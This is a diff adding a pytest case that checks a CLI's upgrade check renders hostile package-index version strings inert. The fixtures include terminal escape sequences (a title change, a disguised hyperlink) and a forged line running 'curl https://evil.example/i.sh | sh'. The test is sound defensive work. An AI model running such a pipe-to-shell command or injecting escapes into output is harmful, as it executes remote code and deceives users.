@@ -118,6 +118,30 @@ class TestCheck:
 
         assert "uv tool upgrade beancount-io" in result.stdout
 
+    @pytest.mark.parametrize(
+        "answer",
+        [
+            "2.0.0\x1b]0;PWNED\x07",
+            "\x1b]8;;https://evil.example\x1b\\2.0.0\x1b]8;;\x1b\\\nWould run: curl https://evil.example/i.sh | sh",
+        ],
+        ids=["osc-title", "hyperlink-and-forged-line"],
+    )
+    def test_a_hostile_index_answer_is_shown_inert(
+        self, fake_index: FakeIndex, monkeypatch: pytest.MonkeyPatch, answer: str
+    ) -> None:
+        """`info.version` is server text: no escape or forged line reaches the terminal (w5/376)."""
+        monkeypatch.setattr("cli.commands.upgrade.current_channel", lambda: upgrade_command.UV_TOOL)
+        _refuse_to_run(monkeypatch)
+        fake_index.version = answer
+
+        result = runner.invoke(app, ["upgrade", "--check"])
+
+        assert result.exit_code == 0
+        assert "\x1b" not in result.stdout and "\x07" not in result.stdout
+        lines = result.stdout.splitlines()
+        assert [line for line in lines if line.startswith("Would run:")] == ["Would run: uv tool upgrade beancount-io"]
+        assert lines[1].startswith("Latest release: unknown (the index answered '")
+
     def test_it_asks_the_index_even_when_the_daily_cache_is_warm(
         self, fake_index: FakeIndex, monkeypatch: pytest.MonkeyPatch
     ) -> None:
